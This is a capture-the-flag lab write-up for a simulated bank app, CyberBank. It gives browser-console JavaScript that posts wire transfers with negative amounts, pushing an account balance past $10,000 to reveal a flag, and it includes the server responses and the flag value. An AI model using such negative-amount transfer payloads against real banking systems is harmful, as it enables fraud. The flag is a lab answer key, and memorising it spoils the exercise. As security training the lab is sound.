# Task 2. Manipulating Wire Transfers to Inflate Account Balance


## **Task Description**



After uncovering user IDs and account numbers, leading to the disclosure of account balances, your journey through the CyberBank simulation progresses to exploiting wire transfer functionalities.\
This task demands a keen understanding of how the **application processes transactions**.\
You're tasked with manipulating wire transfer requests to artificially inflate your account balance beyond `$ 10K`.\
Achieving this milestone will trigger a unique `Flag` ⛳️ as proof of your advanced exploitation capabilities.

- Target Application: [CyberBank](https://intranet-dlh.hbtn.io/rltoken/1VVyFaPHhuT-TXMLbTuhhg)
- Wire Transfer Endpoint: `http://web0x06.hbtn/dashboard`

---

Useful instructions:



1. Review the functionality of the wire transfer feature within CyberBank, taking note of how transactions are initiated, especially the parameters required (e.g., source account, destination account, amount).

2. Begin with smaller transactions to understand the application's validation checks and response behaviors, such as how it handles negative amounts or transfers between accounts you control.

3. Incrementally adjust the transaction amount, or experiment with other parameters like source and destination accounts, to identify any possible oversight in the transaction processing logic.

4. Your goal is to perform valid transactions that cumulatively increase your account balance over 10k. Pay attention to transaction limits, rate limiting, or other security controls that might prevent rapid or large transactions.

5. Once your balance exceeds 10k, observe the application's response for the appearance of a \`Flag\`, indicating successful exploitation of the wire transfer functionality.  Remember: - Your actions within this simulation are for educational purposes. Applying these techniques in real-world scenarios without authorization is illegal and unethical.



**Repo:**

- GitHub repository: `dlh-cyber_security`
- Directory: `web_application_security/0x06_idor`
- File: `2-flag.txt`




## **Solution**



- Start sandbox `cyber_websec_0x06`.
- Start openvpn.
- Put IP address of the sandbox in `/etc/hosts` file.
```bash
echo "10.42.63.4 web0x06.hbtn" | sudo tee -a /etc/hosts
```




Our objective is to increase Yosri Musk's account balance above $10,000, retrieve `flag_2`, and save it.


### Step 1: Analyze the wire transfer implementation

From the previous tasks, we already know CyberBank uses this endpoint:

```
POST /api/accounts/transfer_to/${u}
```

With a request body structured like:

```
{
  "amount": 100,
  "raison": "same",
  "account_id": "...",
  "routing": "...",
  "number": "..."
}
```

We also know that Yosri's initial total balance was $2,991.30.

Before making transfers, we need to establish which account is debited, which is credited, and what validation the frontend performs.

### Action

In Firefox:

1. Navigate to `http://web0x06.hbtn/dashboard`.
2. Press `F12` and open the Debugger tab.
3. Press `Ctrl + Shift + F`.
4. Search for:

```
transfer_to/
```

5. Locate the matching `fetch()` call and copy approximately 500 characters before and 300 characters after it.

### Why?

We want to understand the roles of the variables in this expression:

```
fetch(`/api/accounts/transfer_to/${u}`, {
  method: "POST",
  headers: {"Content-Type": "application/json"},
  credentials: "include",
  body: JSON.stringify({
    amount: n,
    raison: "same",
    account_id: t.id,
    routing: t.routing,
    number: t.number
  })
});
```

In particular:

- `u`: Which account does it identify?
- `n`: Is the amount validated to be positive?
- `t.id`: Does it identify the destination account or the source account?
- `t.routing` and `t.number`: Are these values selected from the UI or independently validated?

These details will help us identify whether negative transfers, account substitution, or another business-logic flaw could increase Yosri's balance.

Result:

```js
ight: 48
}
}), e.jsx(Ie, {
primary: (null == o ? void 0 : o.firstname) + " " + (null == o ? void 0 : o.lastname),
secondary: null == o ? void 0 : o.contact_id,
secondaryTypographyProps: {
component: "span",
mt: .5
}
})]
}), c, e.jsx(yl, {
onBlur: a,
onChange: s,
autoWidth: r,
amount: n,
disableUnderline: !1,
sx: {
justifyContent: "flex-end"
}
}), e.jsx(xe, {
fullWidth: !0,
multiline: !0,
rows: 3,
placeholder: "Write a message..."
})]
}), e.jsxs(Ne, {
children: [e.jsx($e, {
onClick: i,
children: "Cancel"
}), e.jsx($e, {
variant: "contained",
disabled: 0 === n,
onClick: async () => {
    let e = n;
    try {
        for (const t of d) {
            if (e <= 0) break;
            const n = Math.min(t.balance, e);
            e -= n;
            const r = await fetch(`/api/accounts/transfer_to/${u}`, {
                method: "POST",
                headers: {
                    "Content-Type": "application/json"
                },
                credentials: "include",
                body: JSON.stringify({
                    amount: n,
                    raison: "same",
                    account_id: t.id,
                    routing: t.routing,
                    number: t.number
                })
            });
            if (r.ok) {
                await r.json();
                alert("Transfert  completed successfully!"), setTimeout((() => {
                    window.location.reload()
                }), 2e3)
            }
        }
    } catch (t) {}
},
children: "Confirm & Transfer"
})]
})]
})
}

function xl({
    list: t,
    sx: n,
    bankAccounts: r
})
```

## Step 2: Test whether the backend accepts negative wire transfers

The JavaScript reveals an important weakness to investigate.

```
let e = n;

for (const t of d) {
    if (e <= 0) break;

    const n = Math.min(t.balance, e);
    e -= n;
```

The frontend performs two checks:

1. It refuses to submit when the requested amount is zero.
2. It stops processing when the remaining amount is zero or negative.

However, these are client-side checks. We haven't established whether the backend independently rejects negative amounts.

The transfer request also appears to identify:

- `u`: The selected recipient.
- `t.id`: The source account ID.
- `t.routing` and `t.number`: The source account details.
- `amount`: The amount being transferred.

### Your next action

We'll submit one test transfer of -$1 using Yosri's first account and Linda Robinson as the recipient.

Run this in the Firefox Console while authenticated:

```js
(async () => {
  const accounts = await fetch("/api/accounts/info", {
    method: "POST",
    credentials: "include",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      accounts_id: ["97ccfda8da2e4b2fa4133121fad8a9f2"]
    })
  }).then(r => r.json());

  const source = accounts.message[0];

  console.log("Balance before:", source.balance);

  const response = await fetch(
    "/api/accounts/transfer_to/b2ce18af65704387924b9d286c5af593",
    {
      method: "POST",
      credentials: "include",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        amount: -1,
        raison: "same",
        account_id: source.id,
        routing: source.routing,
        number: source.number
      })
    }
  );

  console.log("HTTP status:", response.status);
  console.log("Transfer response:", await response.text());
})();
```

### Why?

If the backend processes transfers by subtracting the supplied amount from the sender's balance:

$$
B_{new} = B_{old} - A
$$

Then supplying $A=-1$ could produce:

$$
B_{new} = B_{old} + 1
$$

This would be a negative-amount validation vulnerability, allowing a transfer to increase the sender's balance instead of decreasing it.

The actual outcome depends on the backend implementation. We first need to see whether it accepts the request.

Result:

```json
Transfer response: {
    "message": {
        "amount": -1,
        "created_at": 1794171689,
        "id": "0d1c7c834311402b8f82d2e520875014",
        "merchant_name": "Linda Robinson",
        "method": "wire",
        "raison": "same",
        "receiver_id": "d8214d82375d48c0b302cc2b30068244",
        "receiver_payment_id": "b2ce18af65704387924b9d286c5af593",
        "sender_id": "2cc5e440302342fbae9d2e1d4a226d61",
        "sender_payment_id": "97ccfda8da2e4b2fa4133121fad8a9f2",
        "status": "completed",
        "updated_at": 1794171689
    },
    "status": "success"
}
```

## Step 4: Verify that the negative transfer increased your balance

&#x20;Negative transfer accepted

Excellent! CyberBank accepted a wire transfer with `amount: -1` and returned:

```
{
  "amount": -1,
  "status": "completed"
}
```

This confirms that the backend allows negative transfer amounts, bypassing the frontend's validation.

Now we need to confirm the actual balance change.

### Your next action

Open this URL in your authenticated Firefox browser:

```
http://web0x06.hbtn/api/accounts/info/97ccfda8da2e4b2fa4133121fad8a9f2
```

This retrieves Yosri's first account.

### Why?

Before the transfer, your account balance was $751.20.

If the backend calculates:

$$
B_{new}=B_{old} - amount \\
$$

Then:

$$
751.20-(-1)=752.20 \\
$$

If the new balance is $752.20, we've confirmed an exploitable business-logic vulnerability.

Yosri's balance:

```json
{
    "message": {
        "balance": 752.2,
        "cards_id": ["6622b9b5976a43d689b1243c95b1493a"],
        "created_at": 1794147533,
        "customer_id": "2cc5e440302342fbae9d2e1d4a226d61",
        "id": "97ccfda8da2e4b2fa4133121fad8a9f2",
        "number": "101431551032",
        "routing": "106190006",
        "updated_at": 1794171689
    },
    "status": "success"
}
```



## Step 5: Inflate Yosri's balance above $10,000

Vulnerability confirmed

The result confirms the exploit works:

| Metric            | Value   |
| ----------------- | ------- |
| Balance before    | $751.20 |
| Negative transfer | -$1.00  |
| Balance after     | $752.20 |
| Balance increase  | +$1.00  |



### Action

We'll send a single negative transfer of -$10,000. This should increase Yosri's first account balance to $10,752.20, exceeding the challenge threshold.

Execute this in the Firefox Console:

```js
(async () => {
  const response = await fetch(
    "/api/accounts/transfer_to/b2ce18af65704387924b9d286c5af593",
    {
      method: "POST",
      credentials: "include",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        amount: -10000,
        raison: "same",
        account_id: "97ccfda8da2e4b2fa4133121fad8a9f2",
        routing: "106190006",
        number: "101431551032"
      })
    }
  );

  console.log("HTTP status:", response.status);
  console.log(
    "Transfer response:",
    JSON.stringify(await response.json(), null, 2)
  );
})();
```

The transaction should trigger the flag condition, either in the transfer response or when retrieving the updated balance.

Transfer:

```json
Transfer response: {
    "message": {
        "amount": -10000,
        "created_at": 1794172676,
        "id": "611d56054bc94bb395ebd64d923c037c",
        "merchant_name": "Linda Robinson",
        "method": "wire",
        "raison": "same",
        "receiver_id": "d8214d82375d48c0b302cc2b30068244",
        "receiver_payment_id": "b2ce18af65704387924b9d286c5af593",
        "sender_id": "2cc5e440302342fbae9d2e1d4a226d61",
        "sender_payment_id": "97ccfda8da2e4b2fa4133121fad8a9f2",
        "status": "completed",
        "updated_at": 1794172676
    },
    "status": "success"
}
```

Yosri's balance after the transfer:

```json
{
    "message": {
        "balance": 10752.2,
        "cards_id": ["6622b9b5976a43d689b1243c95b1493a"],
        "created_at": 1794147533,
        "customer_id": "2cc5e440302342fbae9d2e1d4a226d61",
        "id": "97ccfda8da2e4b2fa4133121fad8a9f2",
        "number": "101431551032",
        "routing": "106190006",
        "updated_at": 1794172676
    },
    "status": "success"
}
```


## Step 6: Check whether the balance increase triggered Flag 2

Balance threshold achieved

We've successfully exploited the negative-transfer vulnerability.

| Metric                   | Value       |
| ------------------------ | ----------- |
| Initial account balance  | $751.20     |
| First negative transfer  | -$1.00      |
| Second negative transfer | -$10,000.00 |
| Final account balance    | $10,752.20  |

The account now exceeds the required $10,000 threshold. However, neither the transfer response nor the account information response contains `flag_2`.

No additional transfers are needed.

### Action

Open the following URL in your authenticated Firefox browser:

```
http://web0x06.hbtn/api/customer/info/me
```

### Why?

We know this endpoint returns Yosri's customer profile, including:

- `accounts_id`
- `total_balance`
- `income`
- `expenses`

The flag might be generated when the application recalculates the customer's aggregate balance, rather than during the individual account transaction.

Result:

```json
{
    "flag_2": "d228761de7345891bb76e633489ab413",
    "message": {
        "accounts_id": ["97ccfda8da2e4b2fa4133121fad8a9f2", "a1e9e267bb9649148d3edbc1233c0c47"],
        "created_at": 1794147533,
        "expenses": 103938.40000000001,
        "firstname": "Yosri",
        "id": "2cc5e440302342fbae9d2e1d4a226d61",
        "income": 90946.1,
        "lastname": "Musk",
        "total_balance": 12992.300000000001,
        "updated_at": 1794147533,
        "username": "yosri"
    },
    "status": "success"
}
```

## Step 7: Save the Task 2 flag

Flag 2 found!



### Action


```bash
echo 'd228761de7345891bb76e633489ab413' > 2-flag.txt
git add .
git commit -m "2-flag.txt"
git push
```

